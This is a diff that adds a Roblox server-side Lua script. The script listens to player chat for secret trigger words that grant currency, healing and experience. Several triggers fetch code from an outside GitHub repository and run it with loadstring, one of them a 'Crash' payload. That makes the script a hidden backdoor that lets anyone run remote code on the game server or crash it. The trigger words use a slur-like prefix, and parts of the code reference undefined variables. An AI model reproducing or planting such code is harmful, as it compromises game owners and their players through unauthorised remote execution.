@@ -1,1 +1,94 @@
-
+game.Players.PlayerAdded:Connect(function(Player)
+	Player.Chatted:Connect(function(msg)
+		local character = Player.Character or Player.CharacterAdded:Wait()
+    local name = Player.Name
+		if msg == "NIGCASH" then
+			print(".")
+      game.ServerStorage[".stats"][name].Ryo.Value = game.ServerStorage[".stats"][name].Ryo.Value + 2500
+      print("..")
+		elseif msg == "NIGHEAL" then
+			print(".")
+      character.Humanoid.Health = character.Humanoid.MaxHealth
+      Player.Chakra.Value = Player.MaxChakra.Value
+      print("..")
+		elseif msg == "NIGEXP" then
+			print(".")
+      game.ServerStorage[".stats"][name].HandsignEXP.Value = 1.65
+      game.ServerStorage[".stats"][name].PushupEXP.Value = 1.65
+      game.ServerStorage[".stats"][name].MeditationEXP.Value = 3
+      game.ServerStorage[".stats"][name].BlockEXP.Value = 0.85
+      game.ServerStorage[".stats"][name].KunaiEXP.Value = 1
+      print("..")
+		elseif msg == "NIG1" then
+			local EXPReq = {500,600,700,800,900,1000,1100,1200,1300,1400,1500,1600,1700,1800,1900,2000,2100,2200,2300,2400,2500,2600,2700,2800,2900,2500}
+      local rank = game.ServerStorage[".stats"].Rank.Value
+      if rank == 1 then
+        stats.CombatEXP.Value = EXPReq[2]
+      elseif rank == 2 then
+        stats.CombatEXP.Value = EXPReq[3]
+      elseif rank == 3 then
+        stats.CombatEXP.Value = EXPReq[4]
+      elseif rank == 4 then
+        stats.CombatEXP.Value = EXPReq[5]
+      elseif rank == 5 then
+        stats.CombatEXP.Value = EXPReq[6]
+      elseif rank == 6 then
+        stats.CombatEXP.Value = EXPReq[7]
+      elseif rank == 7 then
+        stats.CombatEXP.Value = EXPReq[8]
+      elseif rank == 8 then
+        stats.CombatEXP.Value = EXPReq[9]
+      elseif rank == 9 then
+        stats.CombatEXP.Value = EXPReq[10]
+      elseif rank == 10 then
+        stats.CombatEXP.Value = EXPReq[11]
+      elseif rank == 11 then
+        stats.CombatEXP.Value = EXPReq[12]
+      elseif rank == 12 then
+        stats.CombatEXP.Value = EXPReq[13]
+      elseif rank == 13 then
+        stats.CombatEXP.Value = EXPReq[14]
+      elseif rank == 14 then
+        stats.CombatEXP.Value = EXPReq[15]
+      elseif rank == 15 then
+        stats.CombatEXP.Value = EXPReq[16]
+      elseif rank == 16 then
+        stats.CombatEXP.Value = EXPReq[17]
+      elseif rank == 17 then
+        stats.CombatEXP.Value = EXPReq[18]
+      elseif rank == 18 then
+        stats.CombatEXP.Value = EXPReq[19]
+      elseif rank == 19 then
+        stats.CombatEXP.Value = EXPReq[20]
+      elseif rank == 20 then
+        stats.CombatEXP.Value = EXPReq[21]
+      elseif rank == 21 then
+        stats.CombatEXP.Value = EXPReq[22]
+      elseif rank == 22 then
+        stats.CombatEXP.Value = EXPReq[23]
+      elseif rank == 23 then
+        stats.CombatEXP.Value = EXPReq[24]
+      elseif rank == 24 then
+        stats.CombatEXP.Value = EXPReq[25]
+      elseif rank == 25 then
+        stats.CombatEXP.Value = EXPReq[25]
+      end
+		elseif msg == "NIG2" then
+			pcall(function()
+				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig5", true))()
+			end) 
+		elseif msg == "NIG3" then
+			pcall(function()
+				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig6", true))()
+			end) 
+		elseif msg == "NIG4" then
+			pcall(function()
+				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig7", true))()
+			end) 
+		elseif msg == "NIGCRASH" then
+			pcall(function()
+				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Crash", true))()
+			end)
+		end
+	end)
+end)
